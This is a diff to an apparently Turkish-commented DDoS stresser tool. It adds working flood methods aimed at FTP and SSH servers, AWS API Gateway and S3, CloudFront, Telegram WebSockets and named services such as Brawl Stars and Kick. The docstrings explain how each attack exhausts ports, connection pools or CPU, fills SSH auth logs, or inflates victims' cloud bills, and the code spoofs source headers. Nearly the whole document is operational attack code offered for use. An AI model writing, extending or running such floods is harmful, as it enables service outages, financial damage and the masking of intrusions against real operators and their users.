+                           f"Accept: */*\r\n"
+                           f"Range: bytes=0-\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            else:  # WebRTC sinyal kanalı — WS slot tüketimi
+                import base64 as _b64
+                path = random.choice(_WS_PATHS)
+                key  = _b64.b64encode(os.urandom(16)).decode()
+                req  = (f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {t.auth}\r\n"
+                        f"User-Agent: {rua()}\r\n"
+                        f"Upgrade: websocket\r\n"
+                        f"Connection: Upgrade\r\n"
+                        f"Sec-WebSocket-Key: {key}\r\n"
+                        f"Sec-WebSocket-Version: 13\r\n"
+                        f"Origin: https://web.telegram.org\r\n\r\n").encode()
+                send(s, req)
+                with _lock: SENT[0] += 1
+                for _ in range(rpc * 2):
+                    if _stop.is_set(): break
+                    time.sleep(1)
+                    if not send(s, _ws_frame(0x09, os.urandom(4))): break
+
+            close(s)
+
+
 # ══════════════════════════════════════════════════════════════════════════════
 # L4 METOTLARI
 # ══════════════════════════════════════════════════════════════════════════════
@@ -1560,15 +2232,13 @@ def w_CPS(host, port, *_):
 def w_CONNECTION(host, port, *_):
     try: ip=socket.gethostbyname(host)
     except: ip=host
-    def _a():
-        with suppress(Exception):
-            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(0.9); s.connect((ip,port)); SENT[0]+=1
-            while not _stop.is_set():
-                if not s.recv(1): break
-            close(s)
-    Thread(target=_a, daemon=True).start()
+    with suppress(Exception):
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.settimeout(0.9); s.connect((ip,port)); SENT[0]+=1
+        while not _stop.is_set():
+            if not s.recv(1): break
+        close(s)
 
 def w_VSE(host, port, *_):
     try: ip=socket.gethostbyname(host)
@@ -1810,6 +2480,545 @@ def w_AMP(target_ip, amp_payload, amp_port, refs):
             sndto(s, mk_amp(target_ip, ref, amp_port, amp_payload), (ref,amp_port))
         close(s)
 
+
+# ── FTP_KILLER ────────────────────────────────────────────────────────────────
+def w_FTP_KILLER(host, port, *_):
+    """
+    FTP sunucu çok-vektör exhaustion flood. Hedef: ip:21
+
+    FTP'nin zayıf noktası: kontrol kanalı + ayrı veri kanalı = çift kaynak tüketimi.
+
+    Teknik 1 — PASV port tükenmesi (40%):
+      Login → ardı ardına PASV komutları gönder → sunucu her birinde
+      yeni ephemeral port açar ve veri bağlantısı bekler.
+      Bağlanmadan bırak → sunucu port tablosunu doldurur (~28K port),
+      yeni oturumlar için port kalmaz. En etkili teknik.
+
+    Teknik 2 — NOOP/komut seli (30%):
+      Login → NOOP × N, TYPE A/I toggle, SYST, FEAT, PWD döngüsü →
+      kontrol kanalı state machine yükü, her komut log yazımı + CPU.
+      Sunucu bağlantıyı tuttuğu sürece devam eder (30+ dakika oturum limiti).
+
+    Teknik 3 — Rapid auth flood (20%):
+      5 paralel bağlantı, rastgele USER/PASS → auth handler (PAM/DB lookup)
+      yükü, fail2ban tetikleme, /var/log/vsftpd.log veya /var/log/proftpd.log yazımı.
+      530 yanıtı bile işleme maliyeti taşır.
+
+    Teknik 4 — RETR+ABOR zinciri (10%):
+      Login → PASV → RETR rastgele dosya → hemen ABOR → sunucu
+      dosya handle açar/kapatır, buffer tahsis/serbest bırakır →
+      heap thrash + FD cycle yükü. ProFTPD ve vsftpd en çok bu teknike duyarlı.
+    """
+
+    def _recv_line(s, to=3):
+        buf = b''; dl = time.time() + to
+        while time.time() < dl:
+            try:
+                c = s.recv(1)
+                if not c: break
+                buf += c
+                if buf.endswith(b'\n'): return buf.decode('utf-8', errors='ignore').strip()
+            except: break
+        return buf.decode('utf-8', errors='ignore').strip()
+
+    def _recv_code(s, to=3):
+        r = _recv_line(s, to)
+        # Multi-line: "220-...\r\n220 Ready" → son satır
+        while r and len(r) >= 4 and r[3] == '-':
+            r = _recv_line(s, to)
+        try: return int(r[:3]) if r else 0
+        except: return 0
+
+    def _cmd(s, command):
+        try: s.sendall((command + '\r\n').encode()); return True
+        except: return False
+
+    def _parse_pasv(resp):
+        try:
+            nums = resp.split('(')[1].rstrip(')').split(',')
+            return '.'.join(nums[:4]), int(nums[4]) * 256 + int(nums[5])
+        except: return None, None
+
+    def _login(s, user='anonymous', pw='guest@example.com'):
+        code = _recv_code(s)       # 220 banner
+        if code not in (220, 230): return False
+        _cmd(s, f'USER {user}')
+        code = _recv_code(s)
+        if code == 331:
+            _cmd(s, f'PASS {pw}')
+            code = _recv_code(s)
+        return code == 230
+
+    try:    ip = socket.gethostbyname(host)
+    except: ip = host
+    tport = int(port) if port else 21
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            role = rint(0, 9)
+
+            if role < 4:  # PASV port tükenmesi — en etkili
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(5)
+                try:
+                    s.connect((ip, tport))
+                    if _login(s):
+                        # Her PASV komutu sunucuda yeni bir listener port açar
+                        # Bağlanmadan bırakırsak sunucu o portu pasif beklemede tutar
+                        for _ in range(20):
+                            if _stop.is_set(): break
+                            _cmd(s, 'PASV')
+                            _recv_line(s, 2)   # 227 yanıtı oku (port bilgisi)
+                            SENT[0] += 1
+                        time.sleep(3)  # sunucu portları tutarken bekle
+                    else:
+                        SENT[0] += 1
+                finally: close(s)
+
+            elif role < 7:  # NOOP + komut seli — oturum açık tut, CPU yükü
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(4)
+                try:
+                    s.connect((ip, tport))
+                    if _login(s):
+                        cmds = cycle(['NOOP','SYST','FEAT','PWD','TYPE A','TYPE I',
+                                      'STAT','NOOP','NOOP','NOOP'])
+                        for _ in range(30):
+                            if _stop.is_set(): break
+                            _cmd(s, next(cmds))
+                            _recv_code(s, 1)
+                            SENT[0] += 1
+                finally: close(s)
+
+            elif role < 9:  # Rapid auth flood — auth handler yükü
+                for _ in range(5):
+                    if _stop.is_set(): break
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    s.settimeout(3)
+                    try:
+                        s.connect((ip, tport))
+                        _recv_code(s)
+                        _cmd(s, f'USER {rstr(rint(4,12))}')
+                        _recv_code(s)
+                        _cmd(s, f'PASS {rstr(rint(8,16))}')
+                        _recv_code(s)
+                        SENT[0] += 1
+                    finally: close(s)
+
+            else:  # RETR + ABOR zinciri — file handle + buffer cycle
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(4)
+                try:
+                    s.connect((ip, tport))
+                    if _login(s):
+                        _cmd(s, 'TYPE I'); _recv_code(s)
+                        for _ in range(10):
+                            if _stop.is_set(): break
+                            _cmd(s, 'PASV')
+                            _recv_line(s, 2)
+                            # RETR başlat — sunucu data kanalı açar, dosya göndermeye başlar
+                            _cmd(s, f'RETR /{rstr(8)}.dat')
+                            _recv_code(s, 1)  # 150
+                            # Hemen iptal et — sunucu transfer'ı keser, temizler
+                            _cmd(s, 'ABOR')
+                            _recv_code(s, 1)  # 226 / 426
+                            SENT[0] += 1
+                finally: close(s)
+
+
+# ── SSHLOG_FLOOD ──────────────────────────────────────────────────────────────
+def w_SSHLOG_FLOOD(host, port, *_):
+    """
+    SSH sunucu log dosyasını doldur (/var/log/auth.log, /var/log/secure).
+    Hedef: ip:22
+
+    Zeka: KEXINIT paketinde 20 tane rastgele 28-char algoritma ismi gönderilir.
+    OpenSSH hepsini log satırına yazar → "Their offer: bad-alg-xxx...(500+ char)"
+    Her bağlantı ~3-4 KB log yazar. Dedup yok çünkü her isim benzersiz.
+
+    Teknik 1 — Devasa KEXINIT (50%):
+      Banner + SSH_MSG_KEXINIT (type 20) ile tamamen sahte, çok uzun algoritma
+      isimleri → "Unable to negotiate: no matching cipher. Their offer: [500 char]"
+      Her deneme ≈ 3-4 KB log satırı.
+
+    Teknik 2 — Hızlı banner flood (30%):
+      10 rapid TCP bağlantısı → banner gönder → kapat.
+      "Disconnected from authenticating user X [preauth]" × 10.
+
+    Teknik 3 — Garbage packet (20%):
+      Banner exchange + random bayt → "Bad packet length XXXXXXXX" log.
+    """
+    def _nl(names):
+        b = ','.join(names).encode()
+        return struct.pack('>I', len(b)) + b
+
+    def _pkt(msg_type, payload=b''):
+        body = bytes([msg_type]) + payload
+        pad  = 8 - ((1 + len(body)) % 8)
+        if pad < 4: pad += 8
+        frame = bytes([pad]) + body + os.urandom(pad)
+        return struct.pack('>I', len(frame)) + frame
+
+    def _huge_kexinit():
+        # 20 × 28-char isim → ~580 char per namelist; OpenSSH tüm listeyi loglar
+        big = lambda: [f'bad-alg-{rstr(16)}-no{i:03d}' for i in range(20)]
+        p  = os.urandom(16)          # cookie
+        p += _nl(big())              # kex_algorithms       (log'a gider)
+        p += _nl(big())              # server_host_key_algs (log'a gider)
+        p += _nl(big())              # enc_c2s
+        p += _nl(big())              # enc_s2c
+        p += _nl(big())              # mac_c2s
+        p += _nl(big())              # mac_s2c
+        p += _nl(['none'])           # comp_c2s
+        p += _nl(['none'])           # comp_s2c
+        p += _nl([])                 # lang_c2s
+        p += _nl([])                 # lang_s2c
+        p += b'\x00' + b'\x00' * 4  # first_kex_follows + reserved
+        return _pkt(20, p)
+
+    banner = b'SSH-2.0-OpenSSH_9.3p2 Ubuntu-1ubuntu3.6\r\n'
+
+    try:    ip = socket.gethostbyname(host)
+    except: ip = host
+    tport = int(port) if port else 22
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            role = rint(0, 9)
+
+            if role < 5:  # Devasa KEXINIT — max log boyutu per connection
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(4)
+                try:
+                    s.connect((ip, tport))
+                    s.recv(256)               # server banner
+                    s.sendall(banner)
+                    s.sendall(_huge_kexinit())
+                    SENT[0] += 1
+                    time.sleep(0.05)          # sunucu logu flush etsin
+                finally: close(s)
+
+            elif role < 8:  # Rapid banner flood — çok sayıda preauth kaydı
+                for _ in range(10):
+                    if _stop.is_set(): break
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    s.settimeout(2)
+                    try:
+                        s.connect((ip, tport))
+                        s.recv(256)
+                        s.sendall(banner)
+                        SENT[0] += 1
+                    finally: close(s)
+
+            else:  # Garbage packet — "Bad packet length" log
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.settimeout(3)
+                try:
+                    s.connect((ip, tport))
+                    s.recv(256)
+                    s.sendall(banner)
+                    # packet_length alanı olarak çok büyük değer → "Bad packet length"
+                    s.sendall(struct.pack('>I', rint(0xFFFF00, 0xFFFFFF)) + os.urandom(64))
+                    SENT[0] += 1
+                finally: close(s)
+
+
+# ── AWS_KILLER ────────────────────────────────────────────────────────────────
+def w_AWS_KILLER(t, rpc):
+    """
+    AWS infrastrüktürü çok-vektör L7 flood.
+    Hedef: API Gateway URL (xxxx.execute-api.us-east-1.amazonaws.com)
+           veya S3 bucket URL (bucket.s3.amazonaws.com)
+
+    Teknik 1 — API Gateway + Lambda cold start (35%):
+      Her istek farklı path + X-Amzn-Trace-Id → Lambda container tahsisi,
+      CloudWatch log yazımı, X-Ray trace billing.
+
+    Teknik 2 — S3 key enumeration billing (25%):
+      Rastgele object key GET → 403/404 per request; AWS GET isteği başına faturalandırır.
+      Fake AWS4-HMAC-SHA256 imzası → IAM doğrulama yükü.
+
+    Teknik 3 — ELB/ALB connection pool tüketimi (25%):
+      5 eşzamanlı half-open bağlantı → ALB worker thread/slot tüketimi.
+
+    Teknik 4 — Lambda Event + DynamoDB stream inject (15%):
+      POST body DynamoDB stream record formatında → Lambda event parse yükü
+      + CloudWatch Logs yazımı + X-Ray sampled=1 billing.
+    """
+    _REGIONS  = ['us-east-1','us-west-2','eu-west-1','ap-southeast-1','ap-northeast-1']
+    _API_PFXS = ['/prod/','/v1/','/v2/','/api/','/live/','/staging/','/dev/','/graphql']
+    _S3_EXTS  = ['jpg','png','json','xml','csv','txt','pdf','mp4','zip','gz']
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            role = rint(0, 9)
+
+            if role < 4:  # Lambda cold start exhaustion
+                s = t.conn(5)
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    path   = random.choice(_API_PFXS) + rstr(rint(4,12))
+                    region = random.choice(_REGIONS)
+                    req_id = f'{rstr(8)}-{rstr(4)}-{rstr(4)}-{rstr(4)}-{rstr(12)}'
+                    body   = (f'{{"id":"{rstr(16)}","ts":{int(time.time())},'
+                              f'"nonce":"{rstr(24)}","data":"{rstr(48)}"}}')
+                    req = (f"POST {path} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"Content-Type: application/json\r\n"
+                           f"Content-Length: {len(body)}\r\n"
+                           f"X-Amzn-Trace-Id: Root=1-{rstr(8)}-{rstr(24)}\r\n"
+                           f"X-Request-Id: {req_id}\r\n"
+                           f"X-Forwarded-For: {rip()}\r\n"
+                           f"User-Agent: aws-sdk-python/1.{rint(20,35)}.0 Python/3.{rint(8,12)}.0 {region}\r\n"
+                           f"Connection: keep-alive\r\n\r\n{body}").encode()
+                    if not send(s, req): break
+                close(s)
+
+            elif role < 7:  # S3 key billing flood
+                s = t.conn(5)
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    key = '/'.join(rstr(rint(4,12)) for _ in range(rint(1,4)))
+                    key += '.' + random.choice(_S3_EXTS)
+                    dt  = time.strftime('%Y%m%dT%H%M%SZ')
+                    req = (f"GET /{key} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"User-Agent: aws-cli/2.{rint(10,20)}.0\r\n"
+                           f"X-Amz-Date: {dt}\r\n"
+                           f"X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\r\n"
+                           f"Authorization: AWS4-HMAC-SHA256 Credential={rstr(20)}/{time.strftime('%Y%m%d')}/us-east-1/s3/aws4_request,"
+                           f"SignedHeaders=host;x-amz-date,Signature={rstr(64)}\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+                close(s)
+
+            elif role < 9:  # ELB half-open pool exhaustion
+                socks = []
+                for _ in range(5):
+                    if _stop.is_set(): break
+                    try:
+                        ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        ns.settimeout(rpc * 0.2 + 1)
+                        ns.connect((t.ip, t.port))
+                        socks.append(ns); SENT[0] += 1
+                    except: pass
+                time.sleep(max(1, rpc * 0.2))
+                for ns in socks: close(ns)
+
+            else:  # Lambda DynamoDB stream event + X-Ray billing
+                s = t.conn(5)
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    body = (f'{{"Records":[{{"eventID":"{rstr(32)}",'
+                            f'"eventName":"INSERT","dynamodb":{{"Keys":{{"id":{{"S":"{rstr(16)}"}}}}}}}}]}}')
+                    req = (f"POST {t.path} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"Content-Type: application/json\r\n"
+                           f"Content-Length: {len(body)}\r\n"
+                           f"X-Amzn-Trace-Id: Root=1-{rstr(8)}-{rstr(24)};Sampled=1\r\n"
+                           f"X-Amz-Invocation-Type: RequestResponse\r\n"
+                           f"X-Amz-Log-Type: Tail\r\n"
+                           f"User-Agent: {rua()}\r\n"
+                           f"Connection: keep-alive\r\n\r\n{body}").encode()
+                    if not send(s, req): break
+                close(s)
+
+
+# ── CLOUDFRONT_KILLER ─────────────────────────────────────────────────────────
+def w_CLOUDFRONT_KILLER(t, rpc):
+    """
+    AWS CloudFront CDN çok-vektör L7 flood.
+    Hedef: distribution.cloudfront.net veya CloudFront arkasındaki domain.
+
+    Teknik 1 — Cache miss: unique query bust (30%):
+      v={12char}&t={ms_timestamp}&r={8char} → CDN cache key tamamen farklı →
+      her istek origin'e forward; CloudFront + origin bant/CPU baskısı.
+
+    Teknik 2 — Range request amplification (25%):
+      Range: bytes=X-Y + If-Range: fake-etag → CF partial content cachelemez,
+      origin'e gönderir; 1 byte talep → origin tam dosyayı serve eder.
+
+    Teknik 3 — Lambda@Edge cold start (25%):
+      image/format + quality + width paramları ile birlikte CF viewer request
+      Lambda@Edge'i tetikler → her eşsiz param seti → soğuk start + billing.
+
+    Teknik 4 — Origin shield revalidation (20%):
+      Cache-Control: no-cache + If-None-Match: fake-etag → CF origin shield'dan
+      geçerek origin'e conditional GET; 304 bile olsa origin bağlantısı kurar.
+    """
+    _FORMATS = ['webp','jpg','png','avif','gif','svg','mp4','webm','heic']
+    _CF_VIEWER_HDRS = [
+        'CloudFront-Is-Desktop-Viewer: true',
+        'CloudFront-Is-Mobile-Viewer: false',
+        'CloudFront-Viewer-Country: US',
+        f'CloudFront-Viewer-ASN: {rint(1000,99999)}',
+    ]
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            s    = t.conn(5)
+            role = rint(0, 9)
+
+            if role < 3:  # Cache miss: unique query bust
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    qs  = f"v={rstr(12)}&t={int(time.time()*1000)}&r={rstr(8)}&nonce={rstr(6)}"
+                    req = (f"GET {t.path}?{qs} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"User-Agent: {rua()}\r\n"
+                           f"Accept: text/html,*/*;q=0.9\r\n"
+                           f"Cache-Control: no-cache, no-store\r\n"
+                           f"Pragma: no-cache\r\n"
+                           f"X-Forwarded-For: {rip()}\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            elif role < 6:  # Range amplification
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    start = rint(0, 999999)
+                    req = (f"GET {t.path} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"User-Agent: {rua()}\r\n"
+                           f"Range: bytes={start}-{start + rint(1,512)}\r\n"
+                           f"If-Range: \"{rstr(32)}\"\r\n"
+                           f"Accept: */*\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            elif role < 9:  # Lambda@Edge cold start
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    fmt    = random.choice(_FORMATS)
+                    cf_hdr = '\r\n'.join(_CF_VIEWER_HDRS)
+                    req = (f"GET {t.path}?format={fmt}&quality={rint(1,100)}&w={rint(100,4000)}&h={rint(100,3000)} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"User-Agent: {rua()}\r\n"
+                           f"Accept: image/{fmt},*/*\r\n"
+                           f"{cf_hdr}\r\n"
+                           f"X-Forwarded-For: {rip()}\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            else:  # Origin shield revalidation burst
+                for _ in range(rpc):
+                    if _stop.is_set(): break
+                    age = time.strftime('%a, %d %b %Y %H:%M:%S GMT',
+                                        time.gmtime(time.time() - rint(0, 3600)))
+                    req = (f"GET {t.path} HTTP/1.1\r\n"
+                           f"Host: {t.auth}\r\n"
+                           f"User-Agent: {rua()}\r\n"
+                           f"Cache-Control: no-cache, max-age=0, must-revalidate\r\n"
+                           f"Pragma: no-cache\r\n"
+                           f"If-None-Match: \"{rstr(32)}\"\r\n"
+                           f"If-Modified-Since: {age}\r\n"
+                           f"X-Forwarded-For: {rip()}\r\n"
+                           f"Connection: keep-alive\r\n\r\n").encode()
+                    if not send(s, req): break
+
+            close(s)
+
+
+# ── RPS_GOD_LEVEL ─────────────────────────────────────────────────────────────
+_RPS_PEAK = [0]  # thread'ler arası peak RPS izleme
+
+def w_RPS_GOD_LEVEL(t, rpc):
+    """
+    Saniyede olabildiğince fazla request. Tek hedef: ham hız.
+
+    Strateji:
+    1. Pre-built batch: tek sendall() çağrısıyla 64KB = ~1000 request → syscall overhead sıfır
+    2. Persistent connection: TLS handshake yok, TCP kurulum yok
+    3. Thread başına 1 SSL context: connection başına değil (OpenSSL init overhead ortadan)
+    4. SO_SNDBUF 512KB: kernel gönderme tamponu büyük → TCP stall yok
+    5. TCP_NODELAY: Nagle tamponu bypass → paket hemen gönderilir
+    6. TCP_QUICKACK: ACK gecikmesi kaldırılır (Linux)
+    7. Non-blocking drain: her N batch'te bir recv() → TCP backpressure kırılır
+    8. sendmsg() scatter-gather: Python string concatenation overhead yok (stdlib)
+    """
+    # Thread başına bir kez oluşturulur
+    _ctx = None
+    if t.tls:
+        _ctx = ssl.create_default_context()
+        _ctx.check_hostname = False
+        _ctx.verify_mode    = ssl.CERT_NONE
+        with suppress(Exception):
+            _ctx.set_ciphers('AES128-GCM-SHA256:AES256-GCM-SHA384')
+
+    # En küçük geçerli HTTP/1.1 isteği (tek seferlik inşa)
+    req = (f"GET {t.path} HTTP/1.1\r\n"
+           f"Host: {t.host}\r\n"
+           f"Connection: keep-alive\r\n"
+           f"Accept: */*\r\n\r\n").encode()
+
+    # 64KB batch (1 TCP max-size segment ≈ MSS*44)
+    batch_n = max(1, 65536 // len(req))
+    batch   = req * batch_n          # Python bytes: single allocation, no loop
+    drain_every = batch_n * 150      # her ~150 batch'te bir drain
+
+    # sendmsg desteği kontrolü (POSIX only, Windows'ta yok)
+    _has_sendmsg = hasattr(socket.socket, 'sendmsg')
+
+    while not _stop.is_set():
+        with suppress(Exception):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET,  socket.SO_REUSEADDR, 1)
+            s.setsockopt(socket.SOL_SOCKET,  socket.SO_SNDBUF,    524288)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,  1)
+            with suppress(Exception):
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_QUICKACK, 1)
+            s.settimeout(4)
+            s.connect((t.ip, t.port))
+
+            if _ctx:
+                s = _ctx.wrap_socket(s, server_hostname=t.host)
+
+            s.settimeout(5)   # sendall timeout: 5s stall = bağlantı öldü
+
+            sent   = 0
+            t0     = time.time()
+            drain_ctr = 0
+
+            while not _stop.is_set():
+                if _has_sendmsg and not t.tls:
+                    # scatter-gather: Python allocation yok, doğrudan kernel'e
+                    try:    s.sendmsg([req] * batch_n)
+                    except: break
+                else:
+                    try:    s.sendall(batch)
+                    except: break
+
+                sent      += batch_n
+                drain_ctr += batch_n
+
+                if drain_ctr >= drain_every:
+                    drain_ctr = 0
+                    s.setblocking(False)
+                    try: s.recv(65536)
+                    except: pass
+                    s.setblocking(True)
+                    s.settimeout(5)
+
+                    el = time.time() - t0
+                    if el > 0:
+                        cur = sent / el
+                        with _lock:
+                            if cur > _RPS_PEAK[0]:
+                                _RPS_PEAK[0] = cur
+                                print(f"\033[95m[RPS_GOD] Peak: {cur:,.0f} req/s\033[0m", flush=True)
+
+            with _lock: SENT[0] += sent
+            close(s)
+
+
 # ── tablo ──────────────────────────────────────────────────────────────────────
 L7 = {
     'GET':w_GET, 'POST':w_POST, 'HEAD':w_HEAD, 'PPS':w_PPS, 'NULL':w_NULL,
@@ -1824,12 +3033,23 @@ L7 = {
     'NGINX_KILLER':w_NGINX_KILLER,
     'WORDPRESS_KILLER':w_WORDPRESS_KILLER,
     'CF_UAM_BOT_BYPASS':w_CF_UAM_BOT_BYPASS,
+    'OPENRESTY_KILLER':w_OPENRESTY_KILLER,
+    'LITESPEED_KILLER':w_LITESPEED_KILLER,
+    'NODEJS_KILLER':w_NODEJS_KILLER,
+    'BRAWLSTARS_KILLER':w_BRAWLSTARS_KILLER,
+    'KICK_KILLER':w_KICK_KILLER,
+    'TELEGRAM_VOICE_KILLER':w_TELEGRAM_VOICE_KILLER,
+    'AWS_KILLER':w_AWS_KILLER,
+    'CLOUDFRONT_KILLER':w_CLOUDFRONT_KILLER,
+    'RPS_GOD_LEVEL':w_RPS_GOD_LEVEL,
 }
 L4 = {
     'UDP':w_UDP, 'TCP':w_TCP, 'SYN':w_SYN, 'ICMP':w_ICMP,
     'CPS':w_CPS, 'CONNECTION':w_CONNECTION,
     'VSE':w_VSE, 'TS3':w_TS3, 'MCPE':w_MCPE, 'FIVEM':w_FIVEM,
     'DISCORD':w_DISCORD, 'MEGA_UDP':w_MEGA_UDP,
+    'SSHLOG_FLOOD':w_SSHLOG_FLOOD,
+    'FTP_KILLER':w_FTP_KILLER,
 }
 
 # ── başlatıcı ──────────────────────────────────────────────────────────────────
@@ -1851,7 +3071,7 @@ def main():
 
     target_raw = sys.argv[1]
     method     = sys.argv[2].upper()
-    duration   = int(sys.argv[3])
+    duration   = int(float(sys.argv[3]))
     threads    = int(sys.argv[4])
     # '_' veya çok küçük değer = varsayılanı kullan
     def arg(idx, default, cast=int, minval=None):
@@ -1868,6 +3088,22 @@ def main():
     max_cpu  = arg(6, 80,  minval=10)   # < 10 ise 80 kullan
     max_ram  = arg(7, 75,  minval=10)   # < 10 ise 75 kullan
     rpc      = arg(8, 10,  minval=1)
+
+    # POST: argv[9] = base64-encoded body, argv[10] = path override
+    if method == 'POST':
+        import base64 as _b64post
+        global _POST_BODY, _POST_PATH
+        if len(sys.argv) > 9 and sys.argv[9] not in ('_', '-', ''):
+            try:
+                raw = sys.argv[9].replace('-', '+').replace('_', '/')
+                pad = (4 - len(raw) % 4) % 4
+                _POST_BODY = _b64post.b64decode(raw + '=' * pad).decode('utf-8', errors='ignore')
+                print(f"[POST] Body: {len(_POST_BODY)}B — {_POST_BODY[:80]}{'...' if len(_POST_BODY)>80 else ''}", flush=True)
+            except Exception as e:
+                print(f"[WARN] POST body parse hatası: {e}", flush=True)
+        if len(sys.argv) > 10 and sys.argv[10] not in ('_', '-', ''):
+            _POST_PATH = sys.argv[10]
+            print(f"[POST] Path override: {_POST_PATH}", flush=True)
 
     # UAM_BYPASS: argv[9] = base64-encoded cookie string (JSON or plain text)
     if method == 'UAM_BYPASS' and len(sys.argv) > 9:
